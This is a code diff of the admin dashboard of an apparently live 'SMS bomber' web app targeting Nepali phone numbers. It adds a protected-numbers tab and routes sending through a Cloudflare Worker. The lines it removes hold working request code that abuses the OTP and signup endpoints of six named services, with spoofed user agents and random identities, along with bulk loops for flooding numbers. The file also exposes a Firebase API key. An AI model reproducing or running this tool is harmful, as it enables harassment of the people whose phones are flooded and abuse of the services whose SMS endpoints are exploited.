@@ -32,6 +32,14 @@
             --border: #1e293b; --red: #ef4444; --red-hover: #dc2626;
             --red-light: #450a0a; --blue: #3b82f6; --green-light: #064e3b; --amber-light: #451a03;
         }
+        @media (prefers-color-scheme: dark) {
+            :root:not([data-theme="light"]) {
+                --bg: #0b1120; --bg-alt: #111827; --bg-hover: #1e293b;
+                --text: #e2e8f0; --text-secondary: #94a3b8; --text-muted: #64748b;
+                --border: #1e293b; --red: #ef4444; --red-hover: #dc2626;
+                --red-light: #450a0a; --blue: #3b82f6; --green-light: #064e3b; --amber-light: #451a03;
+            }
+        }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html { scroll-behavior: smooth; }
@@ -43,7 +51,6 @@
         }
         .container { width: 100%; max-width: 1100px; margin: 0 auto; padding: 0 16px; }
 
-        /* NAV */
         .nav {
             position: sticky; top: 0; z-index: 100; height: 56px;
             background: rgba(248,250,252,0.88); backdrop-filter: blur(16px);
@@ -76,7 +83,6 @@
         .icon-btn:hover { background: var(--bg-hover); }
         .icon-btn svg { width: 14px; height: 14px; }
 
-        /* LOGIN */
         .login-wrap { display: flex; align-items: center; justify-content: center; min-height: 80vh; padding: 20px; }
         .login-card {
             background: var(--bg-alt); border: 2px solid var(--border);
@@ -94,15 +100,21 @@
         .field { margin-bottom: 10px; text-align: left; }
         .field label { display: block; font-size: 0.74rem; font-weight: 600; margin-bottom: 4px; }
         .field-inp {
-            width: 100%; padding: 9px 12px; border: 1.5px solid var(--border);
+            width: 100%; padding: 9px 40px 9px 12px; border: 1.5px solid var(--border);
             border-radius: var(--radius); font-size: 0.84rem; font-family: var(--font);
             background: var(--bg); color: var(--text); outline: none; transition: var(--transition);
         }
         .field-inp:focus { border-color: var(--red); }
         .field-inp.error { border-color: var(--red); background: var(--red-light); }
         .field-err { font-size: 0.66rem; color: var(--red); margin-top: 2px; display: none; }
+        .pwd-wrap { position: relative; }
+        .pwd-toggle {
+            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; cursor: pointer; color: var(--text-muted);
+            padding: 4px; font-size: 0.9rem; line-height: 1;
+        }
+        .pwd-toggle:hover { color: var(--text); }
 
-        /* DASHBOARD */
         .dashboard { display: none; padding: 20px 0 40px; }
         .dash-header {
             display: flex; align-items: center; justify-content: space-between;
@@ -112,14 +124,12 @@
         .dash-header h2 { font-size: 1.1rem; font-weight: 800; }
         .dash-header .user { font-size: 0.78rem; color: var(--text-secondary); }
 
-        /* TABS */
         .tabs { display: flex; gap: 0; margin-bottom: 16px; border: 1.5px solid var(--border); border-radius: var(--radius); overflow: hidden; }
-        .tab { flex: 1; padding: 8px; text-align: center; font-size: 0.74rem; font-weight: 600; cursor: pointer; background: var(--bg-alt); color: var(--text-secondary); border: none; font-family: var(--font); }
+        .tab { flex: 1; padding: 9px; text-align: center; font-size: 0.74rem; font-weight: 600; cursor: pointer; background: var(--bg-alt); color: var(--text-secondary); border: none; font-family: var(--font); }
         .tab.active { background: var(--red); color: #fff; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
 
-        /* CARDS */
         .card {
             background: var(--bg-alt); border: 1.5px solid var(--border);
             border-radius: var(--radius); padding: 16px; margin-bottom: 12px;
@@ -128,8 +138,7 @@
         .card h3 { font-size: 0.82rem; font-weight: 700; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
         .card h3 svg { width: 16px; height: 16px; color: var(--red); }
         .row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
-        .gateway-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
+        .gateway-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 8px; }
         .gateway-chip {
             display: flex; align-items: center; gap: 6px; padding: 8px 10px;
             border: 1.5px solid var(--border); border-radius: var(--radius);
@@ -138,7 +147,6 @@
         .gateway-chip.active { background: var(--red-light); border-color: var(--red); }
         .gateway-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border); }
         .gateway-chip.active .gateway-dot { background: var(--red); }
-
         textarea.field-inp { resize: vertical; min-height: 80px; line-height: 1.5; }
 
         .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 8px; margin-bottom: 14px; }
@@ -151,9 +159,10 @@
         .table-body { max-height: 350px; overflow-y: auto; }
         .table-row { display: grid; grid-template-columns: 100px 1fr 70px 80px 1fr; padding: 7px 12px; font-size: 0.7rem; border-bottom: 1px solid var(--border); gap: 6px; align-items: center; }
         .table-row:last-child { border-bottom: none; }
-        .st-ok { color: var(--green); font-weight: 700; }
-        .st-fail { color: var(--red); font-weight: 700; }
-        .st-blocked { color: var(--amber); font-weight: 700; }
+        .st-ok { color: var(--green); font-weight: 700; } .st-fail { color: var(--red); font-weight: 700; } .st-blocked { color: var(--amber); font-weight: 700; }
+
+        .protect-table { display: grid; grid-template-columns: 1fr 1fr 1fr; padding: 8px 12px; background: var(--bg-hover); font-size: 0.64rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.03em; color: var(--text-muted); gap: 6px; }
+        .protect-row { display: grid; grid-template-columns: 1fr 1fr 1fr; padding: 7px 12px; font-size: 0.7rem; border-bottom: 1px solid var(--border); gap: 6px; align-items: center; }
 
         .terminal {
             background: var(--bg); border: 1px solid var(--border);
@@ -169,11 +178,19 @@
         .toast.ok { background: var(--green); color: #fff; }
         .toast.err { background: var(--red); color: #fff; }
 
-        @media (max-width: 700px) {
-            .row, .row-3 { grid-template-columns: 1fr; }
+        @media (max-width: 768px) {
+            .row { grid-template-columns: 1fr; }
             .table-head, .table-row { grid-template-columns: 80px 1fr 55px; }
             .table-head span:nth-child(4), .table-head span:nth-child(5),
             .table-row span:nth-child(4), .table-row span:nth-child(5) { display: none; }
+            .protect-table, .protect-row { grid-template-columns: 1fr 1fr; }
+            .tabs { flex-wrap: wrap; }
+            .tab { flex: unset; width: 50%; }
+        }
+        @media (max-width: 400px) {
+            .gateway-grid { grid-template-columns: repeat(2, 1fr); }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .tab { width: 100%; }
         }
     </style>
 </head>
@@ -186,19 +203,22 @@
     </div>
 </nav>
 
-<!-- LOGIN -->
 <div class="login-wrap" id="loginScreen">
     <div class="login-card">
         <div class="shield"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div>
         <h1>Admin Access</h1><p>Sign in with Firebase authentication.</p>
         <div class="field"><label>Email</label><input type="email" class="field-inp" id="email" placeholder="admin@smsbombernp.com" autocomplete="email"></div>
-        <div class="field"><label>Password</label><input type="password" class="field-inp" id="password" placeholder="Enter password" autocomplete="current-password" onkeydown="if(event.key==='Enter')login()"></div>
+        <div class="field"><label>Password</label>
+            <div class="pwd-wrap">
+                <input type="password" class="field-inp" id="password" placeholder="Enter password" autocomplete="current-password" onkeydown="if(event.key==='Enter')login()">
+                <button class="pwd-toggle" onclick="togglePwd()" id="pwdToggle" aria-label="Show password"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
+            </div>
+        </div>
         <div class="field-err" id="loginError"></div>
         <button class="btn btn-red" id="loginBtn" onclick="login()" style="width:100%;justify-content:center;margin-top:8px">Sign In</button>
     </div>
 </div>
 
-<!-- DASHBOARD -->
 <div class="dashboard container" id="dashboard">
     <div class="dash-header">
         <div><h2>Admin Dashboard</h2><div class="user" id="userEmail"></div></div>
@@ -215,6 +235,7 @@
 
     <div class="tabs">
         <button class="tab active" onclick="switchTab('logs')">Logs</button>
+        <button class="tab" onclick="switchTab('protected')">Protected</button>
         <button class="tab" onclick="switchTab('sender')">SMS Sender</button>
     </div>
 
@@ -226,15 +247,26 @@
         </div>
     </div>
 
+    <!-- PROTECTED TAB -->
+    <div class="tab-content" id="tab-protected">
+        <div class="card">
+            <h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Protected Numbers</h3>
+            <div class="table-wrap">
+                <div class="protect-table"><span>Phone</span><span>Name</span><span>Protected At</span></div>
+                <div class="table-body" id="protectedTable" style="max-height:350px"><div style="padding:30px;text-align:center;color:var(--text-muted)">Loading...</div></div>
+            </div>
+        </div>
+    </div>
+
     <!-- SENDER TAB -->
     <div class="tab-content" id="tab-sender">
         <div class="card">
-            <h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Admin SMS Sender — Full Control</h3>
+            <h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Admin SMS Sender</h3>
             <div class="row">
                 <div class="field"><label>Phone Number</label><input type="text" class="field-inp" id="aPhone" placeholder="98XXXXXXXX" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
                 <div class="field"><label>Messages</label><input type="number" class="field-inp" id="aCount" value="1" min="1" max="100"></div>
             </div>
-            <div class="field" style="margin-top:8px"><label>Select Gateways</label>
+            <div class="field" style="margin-top:8px"><label>Gateways</label>
                 <div class="gateway-grid" id="gatewayList"></div>
             </div>
             <div style="display:flex;gap:8px;margin-top:12px">
@@ -251,8 +283,8 @@
         </div>
 
         <div class="terminal">
-            <div class="terminal-head">Admin Terminal <button class="btn btn-sm btn-ghost" onclick="document.getElementById('aTerminal').innerHTML=''">Clear</button></div>
-            <div class="terminal-body" id="aTerminal"><div class="log"><span class="log-time">--:--</span><span class="log-info">Admin sender ready. Full access granted.</span></div></div>
+            <div class="terminal-head">Terminal <button class="btn btn-sm btn-ghost" onclick="document.getElementById('aTerminal').innerHTML=''">Clear</button></div>
+            <div class="terminal-body" id="aTerminal"><div class="log"><span class="log-time">--:--</span><span class="log-info">Ready.</span></div></div>
         </div>
     </div>
 </div>
@@ -262,7 +294,7 @@
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
     import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-auth.js";
-    import { getDatabase, ref, query, orderByChild, limitToLast, onValue, get, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+    import { getDatabase, ref, query, orderByChild, limitToLast, onValue, get, push, set } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
 
     const fc = {
         apiKey: "AIzaSyAxQ0_nu_g0ivWMc820w-mqRpq8JklxUoA",
@@ -277,94 +309,68 @@
     const auth = getAuth(app);
     const db = getDatabase(app);
 
-    // Gateways
+    const WORKER_URL = "https://smsbomber.ethical-laxman.workers.dev/";
     const GATEWAYS = ['clamphook','ambition','merodoctor','collegeinfo','pariksha','quickconnect'];
     const GNAMES = {clamphook:'ClampHook',ambition:'Ambition Guru',merodoctor:'MeroDoctor',collegeinfo:'College Info',pariksha:'Pariksha',quickconnect:'QuickConnect'};
-    
-    // Build gateway UI
+
     var gwHTML = '';
-    GATEWAYS.forEach(function(g){
-        gwHTML += '<div class="gateway-chip active" id="agw-'+g+'" onclick="this.classList.toggle(\'active\')"><div class="gateway-dot"></div>'+GNAMES[g]+'</div>';
-    });
+    GATEWAYS.forEach(function(g){ gwHTML += '<div class="gateway-chip active" id="agw-'+g+'" onclick="this.classList.toggle(\'active\')"><div class="gateway-dot"></div>'+GNAMES[g]+'</div>'; });
     document.getElementById('gatewayList').innerHTML = gwHTML;
 
-    function getSelectedGateways(){
-        var sel = [];
-        GATEWAYS.forEach(function(g){
-            if(document.getElementById('agw-'+g).classList.contains('active')) sel.push(g);
-        });
-        return sel.length ? sel : GATEWAYS;
+    function getSelected(){ var s=[]; GATEWAYS.forEach(function(g){ if(document.getElementById('agw-'+g).classList.contains('active')) s.push(g); }); return s.length ? s : GATEWAYS; }
+
+    function VP(n){ var c=n.replace(/[^0-9]/g,''); if(c.startsWith('977'))c=c.slice(3); var vp=['984','985','986','974','975','976','980','981','982','961','962','988','972','973','970']; return c.length===10&&(c.startsWith('98')||c.startsWith('97'))&&vp.indexOf(c.slice(0,3))!==-1?c:null; }
+    function ST(m,t){ var x=document.getElementById('toast'); x.textContent=m; x.className='toast '+(t==='ok'?'ok':'err'); x.style.display='block'; setTimeout(function(){x.style.display='none'},3000); }
+    function aLog(m,t){ var d=new Date().toLocaleTimeString('en-US',{hour12:false}); var div=document.createElement('div'); div.className='log'; var c=t==='ok'?'log-ok':t==='err'?'log-err':'log-info'; div.innerHTML='<span class="log-time">'+d+'</span><span class="'+c+'">'+m+'</span>'; var term=document.getElementById('aTerminal'); term.appendChild(div); if(term.children.length>100)term.removeChild(term.firstChild); term.scrollTop=term.scrollHeight; }
+
+    async function sendViaWorker(phone, gateway) {
+        try {
+            var r = await fetch(WORKER_URL, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone:phone, gateway:gateway, admin:true}) });
+            var d = await r.json();
+            if(d.ok) { await push(ref(db,'sms_logs'),{phone:phone,status:'delivered',gateway:gateway||'auto',timestamp:new Date().toISOString(),userAgent:'admin-panel',referrer:'admin-panel'}); }
+            else { await push(ref(db,'sms_logs'),{phone:phone,status:'failed',gateway:gateway||'auto',timestamp:new Date().toISOString(),userAgent:'admin-panel',referrer:'admin-panel'}); }
+            return d;
+        } catch(e) { return {ok:false,msg:"Worker error"}; }
     }
 
-    // Utilities
-    var UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15","Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"];
-    function R(){return UA[Math.floor(Math.random()*UA.length)]}
-    function S(l){var s='';for(var i=0;i<l;i++)s+='abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random()*26)];return s}
-    function U(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c=='x'?r:r&0x3|0x8).toString(16)})}
-    function VP(n){var c=n.replace(/[^0-9]/g,'');if(c.startsWith('977'))c=c.slice(3);var vp=['984','985','986','974','975','976','980','981','982','961','962','988','972','973','970'];return c.length===10&&(c.startsWith('98')||c.startsWith('97'))&&vp.indexOf(c.slice(0,3))!==-1?c:null}
-
-    function ST(m,t){var x=document.getElementById('toast');x.textContent=m;x.className='toast '+(t==='ok'?'ok':'err');x.style.display='block';setTimeout(function(){x.style.display='none'},3000)}
-    function aLog(m,t){var d=new Date().toLocaleTimeString('en-US',{hour12:false});var div=document.createElement('div');div.className='log';var c=t==='ok'?'log-ok':t==='err'?'log-err':'log-info';div.innerHTML='<span class="log-time">'+d+'</span><span class="'+c+'">'+m+'</span>';var term=document.getElementById('aTerminal');term.appendChild(div);if(term.children.length>100)term.removeChild(term.firstChild);term.scrollTop=term.scrollHeight}
-
-    // API Functions
-    var F={};
-    F.clamphook=async function(p){var r=await fetch("https://backend.clamphook.com/auth/register",{method:"POST",headers:{"Host":"backend.clamphook.com","Origin":"https://backend.clamphook.com","Content-Type":"application/json","Idempotency-Key":U(),"User-Agent":R()},body:JSON.stringify({mobile:"977-"+p})});if(r.status===200){var d=await r.json();if(d.success&&d.operation==="register_mobile")return{ok:true,msg:"ClampHook"};return{ok:false,msg:d.message}}return{ok:false,msg:"HTTP "+r.status}};
-    F.ambition=async function(p){var h={"Host":"api.ambition.guru","Origin":"https://app.ambition.guru","Referer":"https://app.ambition.guru/","Content-Type":"application/json","Accept":"application/json","fingerprint":"556579844","os":"Android","version":"15","X-Requested-With":"XMLHttpRequest","User-Agent":R()};var r1=await fetch("https://api.ambition.guru/api/web/customer/v3/register",{method:"POST",headers:h,body:JSON.stringify({username:p,token:"",name:S(6),is_register:true,login_type:"mobile_number",type:"customer",purpose:0,country_code:"NP",channel:"sms"})});if(r1.status===200){var d1=await r1.json();if(d1.status===true)return{ok:true,msg:"Ambition"};if(d1.message&&d1.message.includes("already")){var r2=await fetch("https://api.ambition.guru/api/web/customer/v3/mobile-login",{method:"POST",headers:{...h,"Authorization":"Bearer null"},body:JSON.stringify({username:p,token:"",name:"",is_register:"",login_type:"mobile_number",type:"customer",purpose:0,country_code:"NP",channel:"sms"})});if(r2.status===200){var d2=await r2.json();if(d2.status===true)return{ok:true,msg:"Ambition"};return{ok:false,msg:d2.message}}return{ok:false,msg:"HTTP "+r2.status}}return{ok:false,msg:d1.message}}return{ok:false,msg:"HTTP "+r1.status}};
-    F.merodoctor=async function(p){var s=await fetch("https://merodoctor.com/signup",{headers:{"User-Agent":R()}});var ck=s.headers.get("set-cookie")||"";var ci=(ck.match(/ci_session=([^;]+)/)||[])[1]||"";var hd={"Host":"merodoctor.com","Origin":"https://merodoctor.com","Referer":"https://merodoctor.com/signup","Content-Type":"application/x-www-form-urlencoded","Accept":"application/json","X-Requested-With":"XMLHttpRequest","Cookie":"ci_session="+ci,"User-Agent":R()};var r1=await fetch("https://merodoctor.com/login/verifynumber",{method:"POST",headers:hd,body:"mobile_number=%2B977+"+p+"&type=sms"});if(r1.status===200){var d1=await r1.json();if(d1.type==="success")return{ok:true,msg:"MeroDoctor"};var r2=await fetch("https://merodoctor.com/login/sendOtp",{method:"POST",headers:{...hd,"Referer":"https://merodoctor.com/login"},body:"mobileno="+p+"&countrycode=977&type=signup&otp_code=&isresend=Y&mobile_number="+p});if(r2.status===200){var d2=await r2.json();if(d2.type==="success")return{ok:true,msg:"MeroDoctor"};return{ok:false,msg:d2.message}}return{ok:false,msg:d1.message}}return{ok:false,msg:"HTTP "+r1.status}};
-    F.collegeinfo=async function(p){var r=await fetch("https://entrancebase.collegeinfonepal.com/api/auth/send-phone-otp/",{method:"POST",headers:{"Host":"entrancebase.collegeinfonepal.com","Origin":"https://entrance.collegeinfonepal.com","Referer":"https://entrance.collegeinfonepal.com/","Content-Type":"application/json","Accept":"*/*","User-Agent":R()},body:JSON.stringify({phone:p})});if(r.status===200){var d=await r.json();if(d.detail&&d.detail.toLowerCase().includes("sent"))return{ok:true,msg:"CollegeInfo"};return{ok:false,msg:d.detail}}return{ok:false,msg:"HTTP "+r.status}};
-    F.pariksha=async function(p){var r=await fetch("https://backend.pariksha.solutions/api/v2/users/sendOtp",{method:"POST",headers:{"Host":"backend.pariksha.solutions","Origin":"https://pariksha.solutions","Referer":"https://pariksha.solutions/","Content-Type":"application/json","Accept":"*/*","User-Agent":R()},body:JSON.stringify({identifier:p})});if(r.status===200){var d=await r.json();if(d.success)return{ok:true,msg:"Pariksha"};return{ok:false,msg:d.message}}return{ok:false,msg:"HTTP "+r.status}};
-    F.quickconnect=async function(p){var pw=S(10)+'@#1';var r1=await fetch("https://app.quickconnect.biz/api/api/v1/register",{method:"POST",headers:{"Host":"app.quickconnect.biz","Origin":"https://app.quickconnect.biz","Referer":"https://app.quickconnect.biz/sign-up","Content-Type":"application/json","Accept":"application/json","User-Agent":R()},body:JSON.stringify({source:"mobile",password:pw,country_code:"+977",mobile:p})});if(r1.status===201)return{ok:true,msg:"QuickConnect"};var d1=await r1.json();if(d1.message&&d1.message.includes("already")){var r2=await fetch("https://app.quickconnect.biz/api/api/v1/login",{method:"POST",headers:{"Host":"app.quickconnect.biz","Origin":"https://app.quickconnect.biz","Referer":"https://app.quickconnect.biz/login","Content-Type":"application/json","Accept":"application/json","User-Agent":R()},body:JSON.stringify({source:"mobile",password:pw,mobile:p})});if(r2.status===200)return{ok:true,msg:"QuickConnect"};return{ok:true,msg:"Exists"}}return{ok:false,msg:d1.message||"Failed"}};
-
-    async function logToFB(phone,status,gateway){try{push(ref(db,'sms_logs'),{phone:phone,status:status,gateway:gateway||'auto',timestamp:new Date().toISOString(),userAgent:navigator.userAgent.substring(0,100),referrer:'admin-panel'})}catch(e){}}
-
-    // Admin Send
     window.adminSend = async function(all){
-        var p=VP(document.getElementById('aPhone').value);if(!p){ST('Invalid phone','err');return}
-        var n=parseInt(document.getElementById('aCount').value)||1;if(n>100)n=100;
-        var gateways = all ? GATEWAYS : getSelectedGateways();
-        aLog('Admin sending '+n+' msgs to +977-'+p+' via '+gateways.length+' gateways','log-info');
-        for(var i=1;i<=n;i++){
-            var gw=gateways[Math.floor(Math.random()*gateways.length)];
-            try{var r=await F[gw](p);if(r.ok){aLog('#'+i+' ['+GNAMES[gw]+'] Delivered','ok');logToFB(p,'delivered',gw)}else{aLog('#'+i+' ['+GNAMES[gw]+'] '+r.msg,'err');logToFB(p,'failed',gw)}}
-            catch(e){aLog('#'+i+' Error','err');logToFB(p,'failed','error')}
-            if(i<n)await new Promise(function(r){setTimeout(r,800)});
-        }
-        aLog('Done.','ok');ST('SMS sent!','ok');refreshAll();
+        var p=VP(document.getElementById('aPhone').value); if(!p){ST('Invalid phone','err');return}
+        var n=parseInt(document.getElementById('aCount').value)||1; if(n>100)n=100;
+        var gws = all ? GATEWAYS : getSelected();
+        aLog('Sending '+n+' msgs to +977-'+p+' via '+gws.length+' gateways','log-info');
+        for(var i=1;i<=n;i++){ var gw=gws[Math.floor(Math.random()*gws.length)]; var r=await sendViaWorker(p,gw); if(r.ok){aLog('#'+i+' Delivered','ok')}else{aLog('#'+i+' '+r.msg,'err')} if(i<n)await new Promise(function(r){setTimeout(r,500)}); }
+        aLog('Done.','ok');ST('Sent!','ok');refreshAll();
     };
 
     window.adminBulk = async function(){
         var nums=document.getElementById('aBulkNums').value.split(/[\n,;\s]+/).filter(function(l){return l.trim()}).map(function(l){return VP(l.trim())}).filter(function(v){return v});
         if(!nums.length){ST('No valid numbers','err');return}
-        var perNum=parseInt(document.getElementById('aBulkCount').value)||1;if(perNum>10)perNum=10;
-        var gateways=getSelectedGateways();
-        aLog('Bulk: '+nums.length+' numbers x '+perNum+' via '+gateways.length+' gateways','log-info');
-        for(var ni=0;ni<nums.length;ni++){
-            var num=nums[ni];aLog('--- +977-'+num+' ('+(ni+1)+'/'+nums.length+') ---');
-            for(var i=1;i<=perNum;i++){
-                var gw=gateways[Math.floor(Math.random()*gateways.length)];
-                try{var r=await F[gw](num);if(r.ok){aLog('#'+i+' ['+GNAMES[gw]+'] Delivered','ok');logToFB(num,'delivered',gw)}else{aLog('#'+i+' '+r.msg,'err');logToFB(num,'failed',gw)}}
-                catch(e){aLog('#'+i+' Error','err')}
-                if(i<perNum)await new Promise(function(r){setTimeout(r,600)});
-            }
-        }
+        var perNum=parseInt(document.getElementById('aBulkCount').value)||1; if(perNum>10)perNum=10;
+        var gws=getSelected();
+        aLog('Bulk: '+nums.length+' numbers x '+perNum+' via '+gws.length+' gateways','log-info');
+        for(var ni=0;ni<nums.length;ni++){ var num=nums[ni];aLog('--- +977-'+num+' ('+(ni+1)+'/'+nums.length+') ---');
+            for(var i=1;i<=perNum;i++){ var gw=gws[Math.floor(Math.random()*gws.length)]; var r=await sendViaWorker(num,gw); if(r.ok){aLog('#'+i+' Delivered','ok')}else{aLog('#'+i+' '+r.msg,'err')} if(i<perNum)await new Promise(function(r){setTimeout(r,400)}); } }
         aLog('Bulk done.','ok');ST('Bulk sent!','ok');refreshAll();
     };
 
-    function switchTab(t){document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active')});document.querySelectorAll('.tab-content').forEach(function(x){x.classList.remove('active')});document.getElementById('tab-'+t).classList.add('active');event.target.classList.add('active')}
+    function switchTab(t){ document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active')}); document.querySelectorAll('.tab-content').forEach(function(x){x.classList.remove('active')}); document.getElementById('tab-'+t).classList.add('active'); event.target.classList.add('active'); }
 
-    // Auth
     window.login = function(){
         var e=document.getElementById('email').value.trim(),p=document.getElementById('password').value.trim();
         var err=document.getElementById('loginError'),btn=document.getElementById('loginBtn');
-        err.style.display='none';
-        if(!e||!p){err.textContent='Email and password required';err.style.display='block';return}
+        err.style.display='none'; if(!e||!p){err.textContent='Email and password required';err.style.display='block';return}
         btn.disabled=true;btn.textContent='Signing in...';
         signInWithEmailAndPassword(auth,e,p).then(function(){ST('Access granted','ok')}).catch(function(er){
             var m='Invalid credentials';if(er.code==='auth/user-not-found')m='No account found';if(er.code==='auth/wrong-password')m='Wrong password';if(er.code==='auth/too-many-requests')m='Too many attempts';
             err.textContent=m;err.style.display='block';btn.disabled=false;btn.textContent='Sign In';
         });
     };
-    window.logout = function(){signOut(auth).then(function(){ST('Logged out','ok')})};
+    window.logout = function(){ signOut(auth).then(function(){ST('Logged out','ok')}); };
+    window.togglePwd = function(){
+        var inp=document.getElementById('password'); var btn=document.getElementById('pwdToggle');
+        if(inp.type==='password'){ inp.type='text'; btn.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'; }
+        else { inp.type='password'; btn.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>'; }
+    };
 
     onAuthStateChanged(auth,function(user){
         if(user){
@@ -372,7 +378,7 @@
             document.getElementById('dashboard').style.display='block';
             document.getElementById('userEmail').textContent=user.email;
             document.getElementById('navEnd').innerHTML='<button class="btn btn-red btn-sm" onclick="logout()">Logout</button>';
-            loadLogs();loadStats();
+            loadLogs();loadStats();loadProtected();
         } else {
             document.getElementById('loginScreen').style.display='flex';
             document.getElementById('dashboard').style.display='none';
@@ -382,10 +388,10 @@
 
     async function loadStats(){
         var s=await get(ref(db,'sms_logs'));var t=0,d=0,f=0,b=0;
-        s.forEach(function(c){t++;var v=c.val();if(v.status==='delivered')d++;else if(v.status==='blocked')b++;else f++});
+        s.forEach(function(c){t++;var v=c.val();if(v.status==='delivered')d++;else if(v.status==='blocked')b++;else f++;});
         document.getElementById('totalLogs').textContent=t;document.getElementById('deliveredCount').textContent=d;
         document.getElementById('failedCount').textContent=f;document.getElementById('blockedCount').textContent=b;
-        var ps=await get(ref(db,'protected_numbers'));var pc=0;ps.forEach(function(){pc++});
+        var ps=await get(ref(db,'protected_numbers'));var pc=0;ps.forEach(function(){pc++;});
         document.getElementById('protectedCount').textContent=pc;
     }
 
@@ -395,8 +401,7 @@
             var logs=[];snapshot.forEach(function(c){logs.push(c.val())});logs.reverse();
             var html='';logs.forEach(function(l){
                 var time=l.timestamp?new Date(l.timestamp).toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}):'--';
-                var phone=l.phone?'+977-'+l.phone:'--';
-                var status=l.status||'unknown',sc=status==='delivered'?'st-ok':status==='blocked'?'st-blocked':'st-fail';
+                var phone=l.phone?'+977-'+l.phone:'--';var status=l.status||'unknown',sc=status==='delivered'?'st-ok':status==='blocked'?'st-blocked':'st-fail';
                 html+='<div class="table-row"><span style="font-size:0.64rem;color:var(--text-muted)">'+time+'</span><span style="font-weight:600">'+phone+'</span><span class="'+sc+'">'+status+'</span><span style="font-size:0.64rem">'+(l.gateway||'auto')+'</span><span style="font-size:0.6rem;color:var(--text-muted)">'+(l.referrer||'direct')+'</span></div>';
             });
             document.getElementById('logsTable').innerHTML=html||'<div style="padding:30px;text-align:center;color:var(--text-muted)">No logs yet</div>';
@@ -404,8 +409,18 @@
         });
     }
 
-    window.refreshAll = function(){loadLogs();loadStats();ST('Refreshed','ok')};
+    function loadProtected(){
+        var pr=ref(db,'protected_numbers');
+        onValue(pr,function(snapshot){
+            var html='';snapshot.forEach(function(c){var v=c.val();html+='<div class="protect-row"><span>+977-'+v.phone+'</span><span>'+v.name+'</span><span style="font-size:0.64rem;color:var(--text-muted)">'+new Date(v.protected_at).toLocaleDateString()+'</span></div>';});
+            document.getElementById('protectedTable').innerHTML=html||'<div style="padding:30px;text-align:center;color:var(--text-muted)">No protected numbers</div>';
+            loadStats();
+        });
+    }
+
+    window.refreshAll = function(){ loadLogs();loadStats();loadProtected();ST('Refreshed','ok'); };
     window.switchTab = switchTab;
+    window.togglePwd = window.togglePwd;
 </script>
 </body>
 </html>
